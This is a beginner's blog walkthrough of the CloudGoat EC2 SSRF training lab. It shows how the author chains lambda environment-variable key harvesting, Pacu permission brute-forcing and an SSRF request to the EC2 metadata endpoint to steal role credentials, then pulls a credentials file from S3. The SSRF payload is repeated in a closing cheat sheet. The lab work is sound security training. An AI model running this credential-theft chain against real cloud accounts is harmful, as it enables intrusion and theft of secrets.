---
title: "Cloudgoat EC2 SSRF Walkthrough"
date: 2025-05-18
draft: false
language: en
featured_image: ../assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo.png
summary: A walkthrough of the EC2 SSRF medium challenge from CloudGoat
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "AWS", "CloudGoat", "Lambda", "Pacu"]
---
# Introduction & Context

Hey guys! This is a walkthrough of the [Cloudgoat EC2 SSRF](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ec2_ssrf/README.md) Medium Challenge. I completed this challenge as part of Tyler's [Intro to AWS Pentesting course](https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting), so part of this I was guided through, part of it not (I'll clarify which parts were and weren't). This is quite a long challenge, but completing it teached me a lot so hopefully you try it out too. I'm writing this targeted as beginners, so I'll try and explain as much as possible. I'd still consider myself a newbie at this, so don't expect this to be the "optimal" solution, but it's the most logical one (at least for me).

# Setup (Guided)

Only setup we need to do is to start the cloudgoat challenge if you haven't already with

```
cloudgoat create ec2_ssrf
```

Wait till it finishes and grab the keysk, it'll look something like

```
cloudgoat_output_solus_access_key_id = KEY_VALUE
cloudgoat_output_solus_secret_key = SECRET_KEY_VALUE
```

Let's also set up an aws profile with those credentials quickly too with `aws configure --profile solus` (you can use any profile name, solus is just my choice). Copy paste the values and set the region to `us-east-1` (most cloudgoat things will be in that region, so defaulting to that is a good start).

# Enumerate ourself & lambda (Guided)

Step 1 is always to verify that our credentials actually work. Run `aws sts get-caller-identity --profile solus` and it should give back some information like

```json
{
    "UserId": "AIDAVRUVQNVQ7IKNYNKIQ",
    "Account": "381491899745",
    "Arn": "arn:aws:iam::381491899745:user/solus-cgidnr0hwro0sg"
}
```

Now, we're going to be targetting lambda functions, as per the challenge description, so let's try and check if there's anything we can find. Run `aws lambda list-functions --region us-east-1 --profile solus`. Now you could do this in **pacu** too and that would work, but it's just a quick check so manual doesn't take that much extra time. Note the region has to be specified here otherwise it would default to the standard one. Executing that should give you some useful information

```json
{
    "Functions": [
        {
            "FunctionName": "cg-lambda-cgidnr0hwro0sg",
            "FunctionArn": "arn:aws:lambda:us-east-1:381491899745:function:cg-lambda-cgidnr0hwro0sg",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::381491899745:role/cg-lambda-role-cgidnr0hwro0sg-service-role",
            "Handler": "lambda.handler",
            "CodeSize": 223,
            "Description": "Invoke this Lambda function for the win!",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-05-17T20:53:56.750+0000",
            "CodeSha256": "jtqUhalhT3taxuZdjeU99/yQTnWVdMQQQcQGhTRrsqI=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EC2_ACCESS_KEY_ID": "KEY_VALUE_HERE",
                    "EC2_SECRET_KEY_ID": "SECRET_KEY_VALUE_HERE"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "42a89c87-df84-4042-9f57-4db59b709d3d",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/cg-lambda-cgidnr0hwro0sg"
            }
        }
    ]
}
```

This is a treasure trove of information we got here. Key information to note:

* **Function Name:** cg-lambda-cgidnr0hwro0sg
* **Description:** Invoke this Lambda function for the win!
* **Environment**: EC2 Access Key & Secret Access Key ID

Those credentials for EC2 are what we need to go onto our next phase, EC2 Enumeration!

# EC2 Enumeration (Unguided)

As always, when we get new credentials set up a aws profile and check their validity.

```bash
aws configure --profile solus_cred
# Pass in the key values from earlier
aws sts get-caller-identity --profile solus_cred
```

Now we can do either pacu or manual enumeration here. I'm going to do a bit of both here. We'll do the inital bulk search with pacu and then dive in for some details using a quick manual search.

So let's first use pacu to see what this ec2 account can actually do.

```bash
pacu
import_keys solus_cred
run iam__enum_permissions
```

And... We can't do that. We don't have permissions. Alright, let's try another module, the bruteforce one `run iam__bruteforce_permissions`. This one will take a while. There's more than a decent chance it will take a really long while. But you'll see pretty soon that most of the outputs that have the "It worked!" come up start with `ec2`. That's a pretty good sign that this account has permissions to play with `ec2`.

So if we can do stuff with `ec2` we should be able to enumerate that. There's a pacu module just for that, `ec2__num`. Let's run that with `run ec2__enum`. Then grab the data using `data ec2` to view the large json output. The key information is here

```json
"PrivateIpAddresses": [
          {
            "Association": {
              "IpOwnerId": "amazon",
              "PublicDnsName": "ec2-3-228-5-64.compute-1.amazonaws.com",
              "PublicIp": "3.228.5.64"
            },
            "Primary": true,
            "PrivateDnsName": "ip-10-10-10-89.ec2.internal",
            "PrivateIpAddress": "10.10.10.89"
          }
        ],

```

That there is the public ip address for our machine. But what does that mean? If you've ever done a CTF before, think of it like the IP address you get at the start. It's the public IP address for the machine where you can target it. Note that there is also a section called Security Groups, with a name `cg-ec2-ssh-cgidnr0hwro0sg`. We'll look into this in the next step.

Now for a bit of quick manual enumeration. Finding out what securit groups are running is going to be useful as it'll tell us what ports are open. Run `aws ec2 describe-security-groups --region us-east-1 --profile solus_cred` and you'll get a json response once more. Under `IpPermissions` you'll find that ports 80 and 22 are open.

Port 80 is what typically is used for http and 22 is used for ssh. Now that is useful. That likely means there is a webserver being hosted at it's ip, `http://3.228.5.64`. We're not using https (that's port 443 if I remember correctly), so your browser might give a warning. In this case, it's a lab so it's safe but generally avoid http sites (as communication is not encrypted!)

And enumeration of both the lambda & ec2 is done! We found a lambda function that we need to figure a way of executing. We found a web server being hsoted on a public IP. Now the next step is to explore that web server.

# Exploring the website & abuse SSRF (Unguided)

Now that I have an ip, I tried running dirsearch and rustscan (a faster version of nmap) to see if I could find anything useful for quick wins. Unfortunately not this time. So let's go straight and check the url `http://3.228.5.64`

The website will be pretty basic, only a couple lines telling us it's an SSRF demo and a claim that it wants the url to be useful. Now if you've never heard of SSRF, that's totally fair. If you asked me an year ago, heck even a month ago, I'd be blanking. But I've grinded through TryHackMe and one of the rooms I did was [this one,](https://tryhackme.com/room/ssrfhr) and it will teach you everything about how Server Side Request Forgery (SSRF) actullay works. Highly recommend you try it out.

So if we take the hint provided, we can give a shot at a basic file search by going to the url `http://3.228.5.64?url=localhost/config`. And the response tells us we found it! Even though it says it could not find the file, that means the url is the search parameter. Now it's just a matter of finding where we need to look.

And if we google SSRF forgery on EC2, we found that this is actually a really relevant attack! Just a couple months ago (at time of writing), there was an attack that used this same attack in real life. Isn't that awesome (and scary I suppose)? Check [this website](https://technijian.com/server-support/server-vulnerability-management/hackers-target-ssrf-bugs-in-ec2-hosted-sites-to-steal-aws-credentials/) out for information on it.

Now that website also gives us a url we can go to. This url is only accessible by that machine, so if we go to it directly it won't work. So we'll have our EC2 machine go to it and return what it finds.

`http://3.228.5.64?url=http://169.254.169.254/latest/meta-data/`. You'll find it says `cg-ec2-role-cgidnr0hwro0sg`.

To get our chest, we can go to that file and it'll show us our gold (Access Keys!) You should go to `http://3.228.5.64?url=http://169.254.169.254/latest/meta-data/cg-ec2-role-cgidnr0hwro0sg`

The response should look smt like:

```json
{
  "Code" : "Success",
  "LastUpdated" : "2025-05-17T22:34:22Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "SomeAccessKey",
  "SecretAccessKey" : "SomeSecretKey",
  "Token" : "SomeLongToken"
",
  "Expiration" : "2025-05-18T05:03:15Z"
}
```

# Enumerate again(Unguided)

So now we got some new credentials, let's make a new profile with it. Again configure a profile

```bash
aws configure --profile ec2_ssrf
#Pass in the key from earlier
aws sts get-caller-identity --profile ec2_ssrf
```

That last command shouldn't work. Why? I didn't know so I asked chatgpt. What we found was a role and a role is time limited. That means we need to give it the token. There's a few different ways of doing it. The easiest way for me was to run `aws configure set profile.ec2_ssrf.aws_session_token TOKEN_VALUE_HERE`. Now try executing the last command and you should get output!

Let's enumerate the permissions of our current user using pacu:

```bash
pacu
import_keys ec2_ssrf
run iam__enum_permissions
```

And again, permission denied. Time to brute force! Run `run iam__bruteforce_permissions`. All we're trying to do is figure out what this user can do. That first one does enumeration relatively quietly and quickly. The second one takes longer, which is why we're running it as a "last resort". But when you do that you'll see we have a neat permission, we can interact with S3 buckets!

# S3 Bucket Attack! (Unguided)

We're almost there, we just need to grab one more pair of credentials and then run the lambda function. To start off let's find the buckets by running `aws s3 ls --profile ec2_ssrf`. That'll give you a bucket like `cg-secret-s3-bucket-......`. That is probably something useful. Let's go into that bucket

```bash
aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg --profile ec2_ssrf
```

There's a folder called `aws`. Let's check that out

```bash
aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/ --profile ec2_ssrf
```

Note that when we're going into subdirectories, we need to append a final /. Not when we're looking at the parent bucket though. After running that we see a file called `credentials`. Let's copy that into our current directory

```bash
aws s3 cp s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/credentials . --profile ec2_ssrf
```

Run `cat credentials` and you'll grab our last bag of goodies for this challenge. Our final pair of keys!

# Invoke the Lambda for the Win (Unguided)

Use those keys to configure a new profile, same commands as before. 

```bash
aws configure --profile admin
#Pass in the key from earlier
aws sts get-caller-identity --profile admin
```

That should verify your keys work. From the course cheat sheet, we have a template for invoking the lambda. So run

```bash
aws lambda invoke --function-name cg-lambda-cgidnr0hwro0sg output.json --profile admin
```

Your function name should be from whatever you found earlier (likely different from mine). And with that, you'll have a file saved in your working directory. `cat output.json` and you win! 

*Don't forget to run `cloudgot destroy ec2_ssrf` after you finish so you don't end up getting charged for leaving machines on!*

# Closing Thoughts

This was a really entertaining lab scenario. First we needed to find what the lambda function was and look into the environment variables to get some keys. Then we had to enumerate that account to find a hidden webserver. Then we launched an SSRF attack to grab the keys & token for another role. Then use that to enumerate an S3 bucket to grab a final pair of credentials. And close it off by running that lambda function we found at the start. A full circle. I learned a lot from doing this lab, and hopefully this walkthrough helped get over whatever issues you faced. 

# Cheat Sheet

To close off, here's a quick summary of the key commands we needed to run to complete this module (not all, just the ones I would refer back to).

```bash
#Start Up & self enumeration
cloudgoat create ec2_ssrf
aws sts get-caller-identity --profile solus
aws lambda list-functions --region us-east-1 --profile solus

#EC2 Enumeration
pacu
run iam__enum_permissions
run iam__bruteforce_permissions
run ec2__enum
exit 
aws ec2 describe-security-groups --region us-east-1 --profile solus_cred

#SSRF Target
http://3.228.5.64?url=http://169.254.169.254/latest/meta-data/cg-ec2-role-cgidnr0hwro0sg

#Enumerate again
#Same commands as previus enumeration (no need for security groups though)

#S3 Bucket Attack
aws s3 ls --profile ec2_ssrf
aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg --profile ec2_ssrf
aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/ --profile ec2_ssrf
aws s3 cp s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/credentials . --profile ec2_ssrf

#Lambda Invocation
aws lambda invoke --function-name cg-lambda-cgidnr0hwro0sg output.json --profile admin
```
